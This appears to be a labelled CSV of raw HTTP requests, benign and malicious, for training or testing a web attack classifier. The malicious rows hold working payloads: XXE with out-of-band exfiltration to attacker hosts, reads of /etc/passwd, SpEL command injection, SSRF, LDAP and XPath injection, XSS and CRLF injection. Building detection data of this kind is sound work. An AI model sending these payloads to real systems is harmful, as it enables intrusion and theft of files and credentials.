label,text
benign,"GET /static/v2/icons/products/electronics/product-image-77.jpg HTTP/1.1
Host: online-retail-store.biz
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://online-retail-store.biz/products/electronics/tv
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /api/v1/support/tickets?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: helpdesk.enterprise-solutions.net
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
Connection: keep-alive"
benign,"GET /media/images/gallery?category=mountains&sort=latest HTTP/1.1
Host: photoviewer-secure.org
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Referer: https://photoviewer-secure.org/home
DNT: 1"
benign,"GET /blog-sitemap.xml HTTP/1.1
Host: neoteric-green-energy.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept: application/xml
Accept-Language: en-us
Referer: https://neoteric-green-energy.info/home
Connection: keep-alive"
malicious,"POST /ldapsearch HTTP/1.1
Host: secure-auth-directory.app-identity.org
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 64
Pragma: no-cache
Connection: keep-alive

user_id=serviceuser%29%28objectClass%3D*%29&attributes=%2A"
malicious,"POST /user/data HTTP/1.1
Host: nextgen-fintech-solutions.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: application/json
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 133
Cache-Control: max-age=0
Cookie: auth_token=7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a

{""query"": ""/clients/client[username='admin' and substring(password,1,1)='p']/clientID""}"
malicious,"POST /account/profile/save HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: https://my-personal-blog-site.info
User-Agent: Wget/1.20.3 (linux-gnu)
Accept-Encoding: identity
Cache-Control: max-age=0

about=Coder+and+blogger.+<!--#include FiLE=""/var/www/html/.htpasswd""--> Stay tuned!"
benign,"POST /oauth/token HTTP/1.1
Host: auth-secure-access.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 148
Authorization: Basic Y2xpZW50MTIzOnNlY3JldDEyMw==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=ZXlKaGJHY2lPaUpJVXpJMU5pSjkuZXlKcFpDSTZJbWxoZENJNld5SXNJbXRwWkdWdWRDSTZNVGt4TlRJd05qQTJNekkxT0RVNU1EQTVPREV4WkdReE1UVTJPV1JqTjJaaE5qY3hPRFl3T1RVMU5UTXdaVEpsWVRrNE1ERTJPV0puTjJCMVlTSXNJbWxoZENJNld5SXNJbTVsY25ScFpDSTZXeUpqYjIwaU9pSkJNVEF3TXpVd01qSTVPVGc0TVRGa01qQm1OVGcxWW1FMk5HWmpPR0k1WmpVNE9Dd2lhR1Z5YVhSb05pSTZJbWgwZEhCek9pOHZkM2QzTG1Gc0ltVnVJam9pWVdRZ2RsZGtjbVZoWkc5aFpITjFjbVV1WTI5dEwzSnNaVjlqYjNWdVlYUnBiMjRpT2pFMk56UTROVVF3TlRWak1qY3pPVFUzWmpRNVpUZ3pPVEl4WWpNd01UZzBOVGM0TlRkdFlqTXpPVFkyWkdSbE1EVTROemMxWTJNMElncDk=
client_id=appMain
client_secret=xv39PsRp1u93
redirect_uri=https%3A%2F%2Fapp.main-portal.biz%2Fcallback
grant_type=authorization_code&code=c29tZV9hdXRoX2NvZGU="
benign,"POST /api/v1/recipes HTTP/1.1
Host: my-chef-notebook.info
Authorization: Bearer q09fjs80fk29qnwE38fk2MDkxjsLKd8jf3
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Content-Length: 142

{""name"":""Summer Quinoa Salad"",""ingredients"":[""quinoa"",""cucumber"",""cherry tomatoes"",""feta cheese"",""lemon juice""],""steps"":[""Cook quinoa"",""Chop vegetables"",""Mix all ingredients"",""Serve chilled""],""prepTimeMinutes"":25}"
malicious,"PATCH /api/custom_data/store HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 346
Origin: https://console.api.cloud-data-services.ai
X-Requested-With: FetchAPIClient
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: application/json
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""config-params"",
  ""region"": ""us-west-2"",
  ""deployment"": ""blue-green"",
  ""active"": false
}"
benign,"POST /photos/multi-upload HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----BoundaryXYZ1234
Content-Length: 987

------BoundaryXYZ1234
Content-Disposition: form-data; name=""upload[]""; filename=""concept_art1.jpeg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
------BoundaryXYZ1234
Content-Disposition: form-data; name=""upload[]""; filename=""concept_art2.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
------BoundaryXYZ1234--"
malicious,"POST /service/upload HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Type: application/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 263

<!DOCTYPE doc [
<!ENTITY % file SYSTEM ""file:///var/log/auth.log"">
<!ENTITY % dtd SYSTEM ""http://attacker-portal.biz/malicious.dtd"">
%dtd;
%send;
]>
<request>
  <name>upload</name>
  <value>filedata</value>
</request>"
malicious,"POST /api/v1/xml/process HTTP/1.1
Host: xml-processing.enterprise-data.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/xml
Accept-Language: en-US,en;q=0.8
Accept: application/xml
Content-Length: 276

<!DOCTYPE process [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % dtd SYSTEM ""http://payload-exfil.enterprise-data.ai/oob.dtd"">
%dtd;
%send;
]>
<process><item>value</item></process>"
benign,"HEAD /index.html HTTP/1.1
Host: digital-archive-services.net
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /beacon/track HTTP/1.1
Host: metrics.real-time-analytics.ai
Content-Type: text/plain
Origin: https://dashboard.real-time-analytics.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 34
Connection: close

event=page_view&url=/home/dashboard"
benign,"PATCH /v2/users/94321/settings HTTP/1.1
Host: user-settings-cloud.net
Authorization: Bearer token_9476_abcXY123efg
Content-Type: application/json-patch+json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Cache-Control: no-cache
Connection: close
Accept-Language: en-GB,en;q=0.8

[
  {""op"": ""remove"", ""path"": ""/notifications/email""},
  {""op"": ""add"", ""path"": ""/notifications/sms"", ""value"": true}
]"
malicious,"GET /api/v3/items/search?q=test&%71%3D%27%20OR%20%271%27%3D%271 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Pragma: no-cache
Connection: keep-alive"
benign,"GET /profile/view?note=Remember+to+check+the+weekly+progress+reports+and+update+the+team+on+project+milestones+and+roadmap+adjustments+before+Friday HTTP/1.1
Host: pro-management-suite.cloud
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Cookie: session_id=XYZ1234567890abcdef;
Referer: https://pro-management-suite.cloud/dashboard
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /news/%E6%97%A5%E6%9C%AC%E6%96%B0%E8%81%9E HTTP/1.1
Host: global-info-journal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Connection: keep-alive"
benign,"GET /api/v1/orders?customer_id=78154&status=shipped HTTP/1.1
Host: orders.efficient-sales-platform.biz
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzgxNTQiLCJpc3MiOiJlZmZpY2llbnQtc2FsZXMifQ.TrT27PaSrE2CxQV6pkSyJqvRjp-SK83t0XbXDYppLQE
Accept-Encoding: gzip
Connection: close"
benign,"GET /rss.xml HTTP/1.1
Host: urban-gardeners-community.org
Accept: application/rss+xml
User-Agent: Feedly/56.0 (+https://feedly.com)
Referer: https://urban-gardeners-community.org/gardening-tips
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /rss/latest.xml HTTP/1.1
Host: secure-user-portal.net
Accept: application/rss+xml, application/xml;q=0.9
User-Agent: curl/7.79.1
Referer: https://secure-user-portal.net/dashboard
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /api/log HTTP/1.1
Host: data-insights.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json
Accept: application/json
Referer: https://dashboard.data-insights.ai/
Content-Length: 388

{""eventRecord"":{""type"":""user_feedback"",""details"":{""rating"":4,""comments"":""The dashboard loads quickly and UI is intuitive.""},""userInfo"":{""id"":""user8732"",""profile"":{""membership"":""gold"",""preferences"":{""newsletterOptIn"":true}}},""deviceContext"":{""os"":""macOS 13.2"",""browser"":""Chrome 113""}},""timestamp"":""2024-06-01T12:40:22Z""}"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: application/json
Content-Type: application/json
Cache-Control: no-cache
Content-Length: 61
Connection: keep-alive

{""queryUrl"":""http://0177.0.0.1/internal/health?verbose=true""}"
benign,"GET /search?q=coding+best+practices+python HTTP/1.1
Host: devinsights-cloud.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html
Referer: https://devinsights-cloud.ai/docs
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /forum/posts/new HTTP/1.1
Host: creative-arts-community.org
Content-Type: application/json
Content-Language: en-US
Accept: application/json, text/plain
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
X-CSRF-Token: NL9vEqFNJV1XsH8r9VXYXq3P8NJMrweA
Content-Length: 149
Connection: keep-alive

{""topicId"":4572,""authorId"":""user_2389"",""content"":""Just finished a painting tutorial! Here’s my latest acrylic canvas. Feedback welcome!"",""tags"":[""painting"",""tutorial"",""acrylic""]}"
benign,"GET /search?q=beginner%27s+guide+to+california+winery+tours&region=napa+valley&order=popularity HTTP/1.1
Host: travel-explorer.co
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
DNT: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"POST /payment/process HTTP/1.1
Host: fintech-secure-api.financezone.commercial
Authorization: Bearer 1f3e9ecb0a554008aaf769532ddf2a95
Content-Type: application/json
Idempotency-Key: c6519ab9-a90f-4d3d-982b-292e23812d69
X-Request-ID: 426f40dc-3a77-4f60-883e-55293932312b
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
X-Client-Version: 7.3.2
Connection: keep-alive

{""transactionId"":""tnx_987654321"",""amount"":199.99,""currency"":""USD"",""method"":""paypal"",""metadata"":{""ipAddress"":""203.0.113.42"",""device"":""desktop""}}"
benign,"GET /api/export?file=report-final.pdf HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; Pixel 5 Build/SPP4.210612.019)
Accept: application/json
Accept-Encoding: gzip
X-Requested-With: com.clouddataservices.app
Connection: close"
malicious,"POST /api/v1/user/settings HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
Content-Length: 181
User-Agent: Python-urllib/3.9

{""user_id"": ""58731"", ""contact_email"": ""contact@my-personal-blog-site.info"", ""signature_link"": ""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}"
benign,"GET /products/books/science-fiction?page=3&sort=popularity HTTP/1.1
Host: readers-delight.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Accept-Language: en-GB,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://readers-delight.net/
Connection: close"
malicious,"HEAD /api/v3/items/search HTTP/1.1
Host: cache-injected-content.cloud-data-services.ai
User-Agent: Python-urllib/3.9
Accept: application/json
Cache-Control: max-age=0
Connection: close"
malicious,"PUT /app/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.77.0
Origin: https://dashboard.cloud-data-services.ai
Cache-Control: no-cache
Content-Length: 424

{""user_id"":99012,""preferences"":{""notifications"":true,""welcome_msg"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('head -n 5 /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""},""timezone"":""Europe/Berlin""}"
benign,"GET /status HTTP/1.1
Host: fast-track-payments.net
User-Agent: curl/7.80.0
Accept: application/json
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: data-mining-central.org
Content-Type: application/json
Accept: */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
X-Requested-With: XMLHttpRequest
Content-Length: 151

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
malicious,"POST /xml/orders/submit HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/xml
Content-Type: text/xml
Content-Length: 231
Pragma: no-cache

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE orderData [
<!ELEMENT orderData ANY >
<!ENTITY file SYSTEM ""file:///etc/passwd"" >]>
<orderData>
  <orderNumber>67890</orderNumber>
  <orderInfo>&file;</orderInfo>
</orderData>"
malicious,"POST /api/v2/user/notifications/send HTTP/1.1
Host: portal-enterprise-cloud.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Origin: https://portal-enterprise-cloud.io
Content-Length: 249

{""recipient"":""j.sanders@portal-enterprise-cloud.io"",""subject"":""Monthly Summary"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",""priority"":""high""}"
malicious,"POST /user/preferences/save HTTP/1.1
Host: settings-api.dynamic-configs.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/json
X-Notification-Endpoint: http://callback-dns-rebind.attack-vector.biz/track
Content-Length: 59
Pragma: no-cache

{""theme"":""dark-mode"",""notifications"":true,""language"":""en-US""}"
malicious,"POST /account/settings/password HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/json
Content-Length: 269
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Cookie: user_session=84f73f1b4e2d72e658d3baefcf478012
Pragma: no-cache

{
  ""next"": ""/dashboard/%0d%0aContent-Length:%200%0d%0aLocation:%20http://external-secure-user-portal.net/malicious%0d%0a%0d%0a<html>InjectedHTML</html>"",
  ""lang"": ""en-US""
}"
malicious,"POST /user/account/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
X-Debug-Options: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnVXNlciB1cGRhdGUgYXNzZXJ0aW9uJyk8L3NjcmlwdD4=""></iframe>
Content-Length: 35

firstName=John&lastName=Doe&email=john@example.com"
benign,"GET /media/library/search?title=classical+symphonies&composer=beethoven&instrument=violin&year_from=1750&year_to=1850&format=mp3,wav&duration_max=3600&sort=popularity_desc&page=2&limit=25&user_prefs=high_quality,offline_mode HTTP/1.1
Host: symphonic-audiofiles.org
Connection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
Accept-Language: en"
malicious,"GET /services/fetch_info HTTP/1.1
Host: global-inventory.sync-platform.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Data-Source: http://delayed-ssrf-check.dynamic-rebind.zone/get-info
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
malicious,"POST /user/authenticate HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://secure-user-portal.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Connection: close

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%5A"
benign,"POST /forums/discussion/1245/comment_reply HTTP/1.1
Host: openrealm-gaming.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 175
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://openrealm-gaming.net/forums/discussion/1245
Origin: https://openrealm-gaming.net
Cookie: session_token=d438bc78def0997a2214e35fe90bb06a; csrf_id=f68640f0382049eeaa0a8731d2e8bf88
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36

author_name=Ben+Torres&comment_text=Really+love+the+community+here+and+the+helpful+responses.+Keep+it+up!&parent_id=9821&csrf_id=f68640f0382049eeaa0a8731d2e8bf88"
benign,"GET /ebooks/technology/future-of-ai.epub HTTP/1.1
Host: digital-library-hub.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Range: bytes=0-1023
Accept: application/epub+zip,application/octet-stream;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"PUT /api/v2/accounts/39/profile HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Content-Type: application/json
Accept: application/json
If-Match: ""e242f9fd2ff62f95""
Content-Length: 105

{""bio"": ""Writer &amp; &lt;em&gt;editor&lt;/em&gt; focusing on travel, photography &amp; food culture."",""website"":""https://my-personal-blog-site.info/writer""}"
benign,"POST /app/support/ticket/create HTTP/1.1
Host: techreach-support-services.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 2150
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cookie: session_token=78fa876b9d31867edfgh45321; preference=lang%3Den

user_id=834291&subject=Issue+With+Software+Update&details=Following+the+latest+update+applied+to+our+software%2C+we+have+noticed+a+few+unexpected+behaviors+%28non-critical+bugs%29+that+affect+the+user+interface+responsiveness+and+some+report+generation+functions.+Specifically%2C+the+application+takes+longer+to+load+certain+pages+and+reports+occasionally+fail+to+export+correctly+in+PDF+format.+No+data+loss+has+occurred+so+far%2C+and+all+critical+features+remain+operational.+We+have+documented+these+issues+thoroughly+and+attached+screenshots+in+our+internal+tracker.+Please+advise+on+the+next+steps+for+a+possible+patch+or+workaround.+We+appreciate+your+continued+support+and+efforts+in+maintaining+software+quality."
benign,"GET /post-sitemap.xml HTTP/1.1
Host: urban-fashion-trends.co
Accept: text/xml, application/xml
Accept-Language: en-GB,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Referer: https://urban-fashion-trends.co/
Connection: keep-alive"
benign,"POST /api/v1/feedback/send HTTP/1.1
Host: fresh-food-marketplace.org
Content-Type: application/json
Content-Language: en-US
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123.12xyw7J08vVR30N8FxJ
X-CSRF-Token: Njg1N2YzNDUtZTY0Ny00Mzk5LTgxMWYtNmYwZTlkYTFiNmMz

{""customerId"":""3098832"",""rating"":5,""comments"":""Great selection of organic produce and fast delivery service!"",""date"":""2024-06-04T08:12:00Z""}"
malicious,"GET /api/v1/resource HTTP/1.1
Host: online-retail-store.biz
User-Agent: Python-urllib/3.9
Accept: application/json
Cookie: session_filter=(uid=exploit%00"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept-Encoding: gzip, deflate, br
Content-Type: application/json-patch+json
Accept: application/json
Content-Length: 62
Connection: close

[{""op"": ""replace"", ""path"": ""/notifications/push"", ""value"": true}]"
benign,"POST /files/upload HTTP/1.1
Host: docs-user-portal.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
Content-Length: 3512
Origin: https://docs-user-portal.biz
Referer: https://docs-user-portal.biz/upload

-----------------------------9051914041544843365972754266
Content-Disposition: form-data; name=""user_id""

83924
-----------------------------9051914041544843365972754266
Content-Disposition: form-data; name=""description""

Quarterly financial report for review.
-----------------------------9051914041544843365972754266
Content-Disposition: form-data; name=""document""; filename=""report_final.pdf""
Content-Type: application/pdf

%PDF-1.4
%Document placeholder content for benign upload.
-----------------------------9051914041544843365972754266--"
benign,"POST /api/comments/add HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer 2390c0ef-70a5-4f32-b6bd-91c7c1f9980f
Content-Type: application/json
Content-Length: 79
Idempotency-Key: 4f36d2c1-1d29-40f4-9427-522b1e3d6724
X-Request-ID: 7edc9a3c-2e18-4a7f-bf0e-c44f37f20db3
X-Client-Version: 1.4.9
Accept: application/json
Connection: keep-alive

{""postId"":546,""userId"":3498,""comment"":""Thanks for the detailed tutorial! Really helpful.""}"
benign,"POST /contact/send HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Cookie: sessionid=af395dbe9cf047e6a1b2462faab754a6
Content-Length: 115
Connection: keep-alive

message=I+had+to+UPDATE+the+database+entries+after+finding+that+the+old+records+weren%27t+reflecting+real+time+data."
benign,"OPTIONS /products/electronics/tv/details HTTP/1.1
Host: online-retail-store.biz
Origin: https://analytics.finance-dashboard.solar
Access-Control-Request-Method: GET
User-Agent: curl/7.83.1
Accept: */*
Connection: keep-alive"
